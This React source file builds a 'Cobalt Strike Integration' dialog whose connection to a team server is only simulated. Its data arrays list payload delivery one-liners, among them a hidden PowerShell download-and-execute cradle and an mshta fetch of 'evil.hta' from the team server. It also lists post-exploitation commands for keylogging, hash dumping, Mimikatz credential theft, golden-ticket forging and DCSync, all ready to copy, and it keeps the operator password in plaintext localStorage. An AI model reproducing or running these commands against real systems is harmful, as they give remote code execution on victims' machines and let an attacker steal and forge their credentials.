import { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Switch } from "@/components/ui/switch";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { ScrollArea } from "@/components/ui/scroll-area";
import { Badge } from "@/components/ui/badge";
import { toast } from "@/hooks/use-toast";
import { Target, Shield, Radio, Zap, Copy, Check, Server, Key, User, Globe } from "lucide-react";

interface CobaltStrikeConfig {
  teamServerHost: string;
  teamServerPort: string;
  username: string;
  password: string;
  useSSL: boolean;
  autoReconnect: boolean;
}

interface CobaltStrikeDialogProps {
  open: boolean;
  onOpenChange: (open: boolean) => void;
}

const defaultConfig: CobaltStrikeConfig = {
  teamServerHost: "",
  teamServerPort: "50050",
  username: "",
  password: "",
  useSSL: true,
  autoReconnect: true,
};

export function CobaltStrikeDialog({ open, onOpenChange }: CobaltStrikeDialogProps) {
  const [config, setConfig] = useState<CobaltStrikeConfig>(() => {
    const saved = localStorage.getItem("cobalt-strike-config");
    return saved ? JSON.parse(saved) : defaultConfig;
  });
  const [isConnected, setIsConnected] = useState(false);
  const [isConnecting, setIsConnecting] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);

  const handleSaveConfig = () => {
    localStorage.setItem("cobalt-strike-config", JSON.stringify(config));
    toast({
      title: "Configuration Saved",
      description: "Cobalt Strike settings saved locally",
    });
  };

  const handleConnect = async () => {
    if (!config.teamServerHost || !config.username || !config.password) {
      toast({
        title: "Missing Fields",
        description: "Please fill in all required fields",
        variant: "destructive",
      });
      return;
    }

    setIsConnecting(true);
    // Simulate connection attempt
    setTimeout(() => {
      setIsConnecting(false);
      setIsConnected(true);
      handleSaveConfig();
      toast({
        title: "Connected",
        description: `Connected to Team Server at ${config.teamServerHost}`,
      });
    }, 2000);
  };

  const handleDisconnect = () => {
    setIsConnected(false);
    toast({
      title: "Disconnected",
      description: "Disconnected from Team Server",
    });
  };

  const copyToClipboard = (text: string, field: string) => {
    navigator.clipboard.writeText(text);
    setCopiedField(field);
    setTimeout(() => setCopiedField(null), 2000);
  };

  const listenerCommands = [
    {
      name: "HTTP Beacon",
      command: `# In Cobalt Strike GUI:\n# Cobalt Strike → Listeners → Add\n# Payload: Beacon HTTP\n# Host: ${config.teamServerHost || "<TEAM_SERVER>"}\n# Port: 80`,
    },
    {
      name: "HTTPS Beacon",
      command: `# In Cobalt Strike GUI:\n# Cobalt Strike → Listeners → Add\n# Payload: Beacon HTTPS\n# Host: ${config.teamServerHost || "<TEAM_SERVER>"}\n# Port: 443`,
    },
    {
      name: "SMB Beacon",
      command: `# In Cobalt Strike GUI:\n# Cobalt Strike → Listeners → Add\n# Payload: Beacon SMB\n# Pipe Name: \\\\.\pipe\\msagent_##`,
    },
    {
      name: "TCP Beacon",
      command: `# In Cobalt Strike GUI:\n# Cobalt Strike → Listeners → Add\n# Payload: Beacon TCP\n# Port: 4444`,
    },
  ];

  const payloadCommands = [
    {
      name: "Windows EXE",
      command: `# Attacks → Packages → Windows Executable (S)\n# Listener: <select_listener>\n# Output: Windows EXE\n# x64: Check if targeting 64-bit`,
    },
    {
      name: "PowerShell",
      command: `# Attacks → Packages → Payload Generator\n# Listener: <select_listener>\n# Output: PowerShell Command\n\n# One-liner:\npowershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://${config.teamServerHost || "<TEAM_SERVER>"}/a'))"`,
    },
    {
      name: "HTA File",
      command: `# Attacks → Packages → HTML Application\n# Listener: <select_listener>\n# Method: Executable\n\n# Serve via:\nmshta http://${config.teamServerHost || "<TEAM_SERVER>"}/evil.hta`,
    },
    {
      name: "Shellcode",
      command: `# Attacks → Packages → Payload Generator\n# Listener: <select_listener>\n# Output: Raw\n# x64: Check if targeting 64-bit\n\n# Use with custom loader or inject into process`,
    },
  ];

  const beaconCommands = [
    { name: "Get System Info", command: "sysinfo" },
    { name: "List Processes", command: "ps" },
    { name: "Screenshot", command: "screenshot" },
    { name: "Keylogger Start", command: "keylogger" },
    { name: "Dump Hashes", command: "hashdump" },
    { name: "Mimikatz", command: "mimikatz sekurlsa::logonpasswords" },
    { name: "Port Scan", command: "portscan <target> 1-1024 arp 1024" },
    { name: "Spawn Session", command: "spawn x64" },
    { name: "Inject into Process", command: "inject <PID> x64" },
    { name: "Elevate Privileges", command: "elevate svc-exe <listener>" },
    { name: "Golden Ticket", command: "mimikatz kerberos::golden /user:admin /domain:corp.local /sid:<SID> /krbtgt:<HASH> /ptt" },
    { name: "DCSync", command: "dcsync <DOMAIN> <DOMAIN>\\krbtgt" },
  ];

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-4xl h-[85vh] bg-slate-900 border-cyan-500/30 p-0 flex flex-col">
        <DialogHeader className="px-6 pt-6 pb-4 border-b border-slate-700/50 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2 bg-red-500/20 rounded-lg">
              <Target className="w-6 h-6 text-red-400" />
            </div>
            <div>
              <DialogTitle className="text-xl font-bold text-white flex items-center gap-2">
                Cobalt Strike Integration
                {isConnected && (
                  <Badge className="bg-emerald-500/20 text-emerald-400 border-emerald-500/30">
                    Connected
                  </Badge>
                )}
              </DialogTitle>
              <DialogDescription className="text-slate-400">
                Configure Team Server connection and manage beacons
              </DialogDescription>
            </div>
          </div>
        </DialogHeader>

        <Tabs defaultValue="connection" className="flex-1 flex flex-col min-h-0">
          <TabsList className="mx-6 mt-4 bg-slate-800/50 border border-slate-700/50 flex-shrink-0">
            <TabsTrigger value="connection" className="data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-400">
              <Server className="w-4 h-4 mr-2" />
              Connection
            </TabsTrigger>
            <TabsTrigger value="listeners" className="data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-400">
              <Radio className="w-4 h-4 mr-2" />
              Listeners
            </TabsTrigger>
            <TabsTrigger value="payloads" className="data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-400">
              <Zap className="w-4 h-4 mr-2" />
              Payloads
            </TabsTrigger>
            <TabsTrigger value="commands" className="data-[state=active]:bg-cyan-500/20 data-[state=active]:text-cyan-400">
              <Shield className="w-4 h-4 mr-2" />
              Beacon Commands
            </TabsTrigger>
          </TabsList>

          <div className="flex-1 min-h-0 px-6 pb-6">
            <ScrollArea className="h-full mt-4">
              <TabsContent value="connection" className="mt-0 space-y-6">
                {/* Team Server Configuration */}
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50 space-y-4">
                  <h3 className="text-sm font-semibold text-cyan-400 uppercase tracking-wider flex items-center gap-2">
                    <Server className="w-4 h-4" />
                    Team Server Configuration
                  </h3>
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2">
                        <Globe className="w-3.5 h-3.5" />
                        Team Server Host
                      </Label>
                      <Input
                        value={config.teamServerHost}
                        onChange={(e) => setConfig({ ...config, teamServerHost: e.target.value })}
                        placeholder="192.168.1.100 or teamserver.local"
                        className="bg-slate-900 border-slate-600 text-white"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300">Port</Label>
                      <Input
                        value={config.teamServerPort}
                        onChange={(e) => setConfig({ ...config, teamServerPort: e.target.value })}
                        placeholder="50050"
                        className="bg-slate-900 border-slate-600 text-white"
                      />
                    </div>
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2">
                        <User className="w-3.5 h-3.5" />
                        Username
                      </Label>
                      <Input
                        value={config.username}
                        onChange={(e) => setConfig({ ...config, username: e.target.value })}
                        placeholder="operator"
                        className="bg-slate-900 border-slate-600 text-white"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-slate-300 flex items-center gap-2">
                        <Key className="w-3.5 h-3.5" />
                        Password
                      </Label>
                      <Input
                        type="password"
                        value={config.password}
                        onChange={(e) => setConfig({ ...config, password: e.target.value })}
                        placeholder="••••••••"
                        className="bg-slate-900 border-slate-600 text-white"
                      />
                    </div>
                  </div>

                  <div className="flex items-center gap-6 pt-2">
                    <div className="flex items-center gap-2">
                      <Switch
                        checked={config.useSSL}
                        onCheckedChange={(checked) => setConfig({ ...config, useSSL: checked })}
                      />
                      <Label className="text-slate-400 text-sm">Use SSL/TLS</Label>
                    </div>
                    <div className="flex items-center gap-2">
                      <Switch
                        checked={config.autoReconnect}
                        onCheckedChange={(checked) => setConfig({ ...config, autoReconnect: checked })}
                      />
                      <Label className="text-slate-400 text-sm">Auto-reconnect</Label>
                    </div>
                  </div>
                </div>

                {/* Connection Status */}
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${isConnected ? 'bg-emerald-500 shadow-lg shadow-emerald-500/50' : 'bg-red-500/70'}`} />
                      <span className="text-slate-300">
                        {isConnected 
                          ? `Connected to ${config.teamServerHost}:${config.teamServerPort}` 
                          : "Not connected to Team Server"}
                      </span>
                    </div>
                    <div className="flex gap-2">
                      <Button
                        variant="outline"
                        size="sm"
                        onClick={handleSaveConfig}
                        className="border-slate-600 hover:bg-slate-700"
                      >
                        Save Config
                      </Button>
                      {isConnected ? (
                        <Button
                          variant="destructive"
                          size="sm"
                          onClick={handleDisconnect}
                        >
                          Disconnect
                        </Button>
                      ) : (
                        <Button
                          size="sm"
                          onClick={handleConnect}
                          disabled={isConnecting}
                          className="bg-cyan-600 hover:bg-cyan-500"
                        >
                          {isConnecting ? "Connecting..." : "Connect"}
                        </Button>
                      )}
                    </div>
                  </div>
                </div>

                {/* Quick Start Guide */}
                <div className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                  <h3 className="text-sm font-semibold text-amber-400 uppercase tracking-wider mb-3">
                    Quick Start
                  </h3>
                  <div className="space-y-2 text-sm text-slate-400">
                    <p>1. Start your Team Server: <code className="bg-slate-900 px-2 py-1 rounded text-cyan-400">./teamserver &lt;IP&gt; &lt;password&gt;</code></p>
                    <p>2. Enter the Team Server details above and connect</p>
                    <p>3. Create listeners and generate payloads from the tabs above</p>
                    <p>4. Deploy payloads to targets and manage beacons</p>
                  </div>
                </div>
              </TabsContent>

              <TabsContent value="listeners" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">
                  Reference commands for setting up Cobalt Strike listeners. Execute these in the Cobalt Strike GUI.
                </p>
                {listenerCommands.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-sm font-semibold text-cyan-400">{item.name}</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(item.command, `listener-${index}`)}
                        className="h-7 px-2"
                      >
                        {copiedField === `listener-${index}` ? (
                          <Check className="w-4 h-4 text-emerald-400" />
                        ) : (
                          <Copy className="w-4 h-4 text-slate-400" />
                        )}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre-wrap">
                      {item.command}
                    </pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="payloads" className="mt-0 space-y-4">
                <p className="text-sm text-slate-400 mb-4">
                  Payload generation references for different delivery methods.
                </p>
                {payloadCommands.map((item, index) => (
                  <div key={index} className="p-4 bg-slate-800/50 rounded-lg border border-slate-700/50">
                    <div className="flex items-center justify-between mb-2">
                      <h4 className="text-sm font-semibold text-amber-400">{item.name}</h4>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyToClipboard(item.command, `payload-${index}`)}
                        className="h-7 px-2"
                      >
                        {copiedField === `payload-${index}` ? (
                          <Check className="w-4 h-4 text-emerald-400" />
                        ) : (
                          <Copy className="w-4 h-4 text-slate-400" />
                        )}
                      </Button>
                    </div>
                    <pre className="text-xs text-slate-300 bg-slate-900 p-3 rounded overflow-x-auto whitespace-pre-wrap">
                      {item.command}
                    </pre>
                  </div>
                ))}
              </TabsContent>

              <TabsContent value="commands" className="mt-0">
                <p className="text-sm text-slate-400 mb-4">
                  Common Beacon commands for post-exploitation. Click to copy.
                </p>
                <div className="grid grid-cols-2 gap-3">
                  {beaconCommands.map((item, index) => (
                    <div
                      key={index}
                      className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 hover:border-cyan-500/40 cursor-pointer transition-colors"
                      onClick={() => copyToClipboard(item.command, `beacon-${index}`)}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <span className="text-xs font-medium text-slate-300">{item.name}</span>
                        {copiedField === `beacon-${index}` ? (
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                        ) : (
                          <Copy className="w-3.5 h-3.5 text-slate-500" />
                        )}
                      </div>
                      <code className="text-[11px] text-cyan-400 font-mono">{item.command}</code>
                    </div>
                  ))}
                </div>
              </TabsContent>
            </ScrollArea>
          </div>
        </Tabs>
      </DialogContent>
    </Dialog>
  );
}
